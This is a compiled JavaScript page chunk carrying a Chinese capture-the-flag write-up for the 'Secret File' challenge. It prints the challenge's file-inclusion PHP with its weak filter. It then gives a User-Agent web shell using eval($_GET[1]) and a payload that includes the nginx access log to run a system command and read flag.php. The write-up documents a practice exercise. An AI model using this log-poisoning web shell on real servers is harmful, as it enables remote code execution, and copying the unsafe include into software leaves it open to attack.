(window.webpackJsonp=window.webpackJsonp||[]).push([[105],{467:function(t,s,a){"use strict";a.r(s);var n=a(7),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"极客大挑战-2019-secret-file"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#极客大挑战-2019-secret-file"}},[t._v("#")]),t._v(" [极客大挑战 2019]Secret File")]),t._v(" "),s("p",[t._v("打开f12调试工具，看到页面源码存在文件"),s("code",[t._v("Archive_room.php")]),t._v("文件，访问")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://the0n3.top/medias/daily/secret/arch.png",alt:"arch"}})]),t._v(" "),s("p",[t._v("在"),s("code",[t._v("Archive_room.php")]),t._v("里的按钮点击后，跳转到了end.php。在调试工具网络里可以看到，这个过程请求了"),s("code",[t._v("action.php")]),t._v("，但是又跳到"),s("code",[t._v("end.php")]),t._v("了")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://the0n3.top/medias/daily/secret/action.png",alt:"action"}})]),t._v(" "),s("p",[t._v("一时手足无措了。看了大佬思路，发现可以bp抓包看这个过程的action.php，又学到了")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://the0n3.top/medias/daily/secret/secr3t.png",alt:"secr3t"}})]),t._v(" "),s("p",[t._v("抓包可以看到"),s("code",[t._v("action.php")]),t._v("页面有提示文件"),s("code",[t._v("secr3t.php")]),t._v("文件")]),t._v(" "),s("p",[t._v("访问secr3t.php，页面源码")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("highlight_file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("__FILE__")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("error_reporting")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'file'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("strstr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"../"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("stristr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"tp"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("stristr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"input"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("stristr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"data"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"Oh no!"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("exit")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("include")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//flag放在了flag.php里")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br")])]),s("p",[t._v("一个简单的文件包含，但是过滤了"),s("code",[t._v("../")]),t._v("、"),s("code",[t._v("tp")]),t._v("、"),s("code",[t._v("input")]),t._v("、"),s("code",[t._v("data")]),t._v("，。还可以包含日志，那就试试。注意日志包含写木马不能有错误，有错误日志就不能用了，只能重新开容器")]),t._v(" "),s("p",[t._v("UA(user-agent)："),s("code",[t._v("<?php highlight_file(__FILE__);eval($_GET[1]);?>")])]),t._v(" "),s("p",[t._v("payload："),s("code",[t._v("?file=/var/log/nginx/access.log&1=system('tac flag.php');")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://the0n3.top/medias/daily/secret/flag.png",alt:"flag"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);